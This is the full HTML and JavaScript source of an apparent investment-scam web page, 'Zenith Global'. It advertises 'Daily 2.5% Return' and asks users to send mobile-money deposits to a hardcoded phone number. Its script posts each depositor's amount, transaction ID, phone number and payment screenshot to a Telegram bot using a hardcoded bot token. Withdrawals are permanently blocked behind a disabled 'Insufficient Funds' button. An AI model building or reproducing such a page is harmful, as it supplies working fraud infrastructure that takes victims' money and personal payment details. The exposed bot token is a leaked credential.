<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith Global | Professional Assets</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #020617; color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass-card { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 32px; }
        .page-section { display: none; animation: fadeIn 0.4s ease forwards; }
        .page-section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .bottom-nav { background: rgba(2, 6, 23, 0.9); backdrop-filter: blur(20px); border-top: 1px solid rgba(255,255,255,0.05); }
    </style>
</head>
<body class="pb-24">

    <header class="p-6 sticky top-0 bg-slate-950/95 backdrop-blur-xl z-50 border-b border-white/5">
        <div class="flex justify-between items-center mb-6">
            <div class="flex items-center space-x-2">
                <div class="w-7 h-7 bg-emerald-500 rounded-lg flex items-center justify-center font-black text-black italic">Z</div>
                <h1 class="text-[10px] font-black tracking-[0.2em] uppercase italic text-white">Zenith Global</h1>
            </div>
            <div class="text-[9px] font-bold text-emerald-400 border border-emerald-500/20 px-3 py-1 rounded-full uppercase italic bg-emerald-500/5">Admin V2</div>
        </div>
        
        <div class="grid grid-cols-3 gap-2">
            <div class="bg-slate-900/50 p-4 rounded-3xl border border-white/5 text-center">
                <p class="text-[7px] font-black text-slate-500 uppercase tracking-widest mb-1">Available</p>
                <h3 class="text-xs font-black italic">$0.00</h3>
            </div>
            <div class="bg-slate-900/50 p-4 rounded-3xl border border-white/5 text-center">
                <p class="text-[7px] font-black text-slate-500 uppercase tracking-widest mb-1">Yield</p>
                <h3 class="text-xs font-black italic">$0.00</h3>
            </div>
            <div class="bg-slate-900/50 p-4 rounded-3xl border border-white/5 text-center">
                <p class="text-[7px] font-black text-slate-500 uppercase tracking-widest mb-1">Bonus</p>
                <h3 class="text-xs font-black italic">$0.00</h3>
            </div>
        </div>
    </header>

    <main class="px-6 mt-6">
        
        <section id="home" class="page-section active space-y-5">
            <div class="glass-card p-6 bg-emerald-500/5 border-l-4 border-emerald-500">
                <span class="text-[9px] font-black text-emerald-500 uppercase italic">Active Institutional Node</span>
                <h2 class="text-3xl font-black mt-1 italic tracking-tighter">$0.00</h2>
            </div>
            
            <h3 class="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] mt-8">Investment Plans</h3>
            <div class="space-y-3">
                <div class="glass-card p-5 flex justify-between items-center border border-emerald-500/10">
                    <div>
                        <h4 class="text-sm font-black italic">Starter Node</h4>
                        <p class="text-[9px] text-slate-400">Daily 2.5% Return</p>
                    </div>
                    <button class="bg-emerald-600/20 text-emerald-400 px-4 py-2 rounded-full text-[10px] font-black italic border border-emerald-500/20">$10.00</button>
                </div>
            </div>
        </section>

        <section id="deposit" class="page-section space-y-6">
            <h2 class="text-xl font-black uppercase italic text-emerald-400 tracking-widest">Add Assets</h2>
            
            <div class="space-y-4">
                <div class="bg-slate-900 p-5 rounded-[32px] border border-white/5">
                    <p class="text-[9px] font-black text-slate-500 uppercase mb-2 italic">Enter Amount (USD)</p>
                    <input type="number" id="usdAmount" placeholder="0.00" class="w-full bg-transparent text-3xl font-black outline-none text-white italic">
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <button onclick="setGateway('Bkash')" class="p-5 bg-slate-900 rounded-[30px] border border-white/5 flex flex-col items-center hover:border-pink-500 transition">
                        <span class="text-[10px] font-black uppercase text-slate-400">Bkash</span>
                    </button>
                    <button onclick="setGateway('Nagad')" class="p-5 bg-slate-900 rounded-[30px] border border-white/5 flex flex-col items-center hover:border-orange-500 transition">
                        <span class="text-[10px] font-black uppercase text-slate-400">Nagad</span>
                    </button>
                </div>

                <div id="paymentBox" class="hidden space-y-5 pt-6 border-t border-white/5 animate-fadeIn">
                    <div class="p-6 bg-emerald-500/5 rounded-[32px] border border-dashed border-emerald-500/30 text-center">
                        <p class="text-[10px] font-bold text-slate-400 uppercase italic">Send to <span id="gatewayTitle" class="text-white"></span></p>
                        <h2 id="adminNumber" class="text-2xl font-black text-emerald-400 tracking-[0.2em] italic mt-1"></h2>
                    </div>

                    <div class="space-y-4">
                        <input type="text" id="trxId" placeholder="Transaction ID (TrxID)" class="w-full bg-slate-900 border border-white/5 p-5 rounded-[28px] text-xs font-bold outline-none focus:border-emerald-500 italic">
                        <input type="text" id="senderNum" placeholder="Your Number (017...)" class="w-full bg-slate-900 border border-white/5 p-5 rounded-[28px] text-xs font-bold outline-none focus:border-emerald-500 italic">
                        
                        <div class="p-5 bg-slate-900 rounded-[28px] border border-white/5">
                            <p class="text-[9px] font-black text-slate-500 uppercase mb-3 italic">Upload Screenshot</p>
                            <input type="file" id="screenshot" accept="image/*" class="text-[10px] text-slate-400 file:bg-emerald-600 file:border-0 file:rounded-full file:px-4 file:py-2 file:text-white file:font-black">
                        </div>

                        <button id="submitBtn" onclick="sendToTelegram()" class="w-full bg-emerald-600 py-5 rounded-[40px] font-black uppercase text-[11px] tracking-[0.4em] italic shadow-lg active:scale-95 transition-all">Verify Assets</button>
                    </div>
                </div>
            </div>
        </section>

        <section id="withdraw" class="page-section glass-card p-8 text-center space-y-4">
            <h2 class="text-xl font-black uppercase italic text-blue-400">Withdrawal</h2>
            <p class="text-[10px] text-slate-500 uppercase font-black italic">Minimum threshold: $10.00 USD.</p>
            <div class="pt-6">
                <button class="bg-slate-800 text-slate-500 px-8 py-4 rounded-full text-[10px] font-black uppercase italic cursor-not-allowed">Insufficient Funds</button>
            </div>
        </section>

    </main>

    <nav class="fixed bottom-0 left-0 right-0 p-5 bottom-nav z-[100]">
        <div class="flex justify-around items-center max-w-md mx-auto">
            <button onclick="showPage('home')" class="flex flex-col items-center">
                <svg class="w-6 h-6 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>
                <span class="text-[8px] font-black uppercase mt-1">Dashboard</span>
            </button>
            <button onclick="showPage('deposit')" class="bg-emerald-600 p-4 rounded-full -mt-12 shadow-2xl shadow-emerald-500/50 active:scale-90 transition">
                <svg class="w-7 h-7 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M12 4v16m8-8H4"></path></svg>
            </button>
            <button onclick="showPage('withdraw')" class="flex flex-col items-center">
                <svg class="w-6 h-6 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                <span class="text-[8px] font-black uppercase mt-1">Funds</span>
            </button>
        </div>
    </nav>

    <script>
        const botToken = "8331944592:AAFRG5tSCCK-3eC0E5Et3bttUu3R7C5ASko"; 
        const chatId = "8441814515";
        let selectedGateway = "";

        function showPage(id) {
            document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function setGateway(name) {
            selectedGateway = name;
            document.getElementById('paymentBox').classList.remove('hidden');
            document.getElementById('gatewayTitle').innerText = name.toUpperCase();
            document.getElementById('adminNumber').innerText = (name === 'Bkash') ? "01627885003" : "01627885003";
        }

        async function sendToTelegram() {
            const usd = document.getElementById('usdAmount').value;
            const trx = document.getElementById('trxId').value;
            const sender = document.getElementById('senderNum').value;
            const photoInput = document.getElementById('screenshot');
            const photo = photoInput.files[0];
            const btn = document.getElementById('submitBtn');

            if(!usd || !trx || !sender || !photo) {
                alert("সবগুলো তথ্য সঠিকভাবে পূরণ করুন এবং স্ক্রিনশট আপলোড করুন।");
                return;
            }

            btn.innerText = "SECURITY VERIFYING...";
            btn.disabled = true;

            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", photo);
            formData.append("caption", `🚀 **NEW ASSET DEPOSIT**\n\n💰 Amount: $${usd}\n💳 Gateway: ${selectedGateway}\n🆔 TrxID: ${trx}\n📱 Sender: ${sender}\n👤 User: Shamim (MBA)\n⏰ Time: ${new Date().toLocaleString()}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
                
                if(response.ok) {
                    alert("SUCCESS! Deposit request sent to Admin.");
                    location.reload();
                } else {
                    const errorData = await response.json();
                    alert("Error: " + errorData.description);
                }
            } catch (err) {
                alert("Connection Error! Check your internet.");
            } finally {
                btn.innerText = "Verify Assets";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
